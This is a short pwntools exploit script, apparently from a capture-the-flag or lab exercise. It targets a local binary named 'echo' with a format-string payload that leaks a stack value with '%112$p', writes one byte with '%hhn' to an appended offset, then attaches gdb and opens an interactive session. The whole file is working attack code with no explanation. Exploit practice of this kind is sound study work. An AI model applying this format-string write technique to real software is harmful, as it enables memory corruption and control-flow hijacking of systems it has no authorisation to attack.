from pwn import *

def exploit(offset):
    # p = process("./echo")

    payload = ''
    payload += '%{}$p'.format(0x70)
    payload += '%{}$hhn'.format(6 + (32 / 8))
    payload = payload.ljust(32, 'A')
    payload += p8(offset)

    # payload = ''
    # payload += 'A' * 33

    gdb.attach(p, 'pie break *0x8b8')

    p.sendline(payload)

    p.interactive()

if __name__ == "__main__":
    # for offset in range(0, 256, 8):
    p = process("./echo")
    exploit(0x98)
    # log.info("Offset : {}".format(hex(offset)))
    p.close()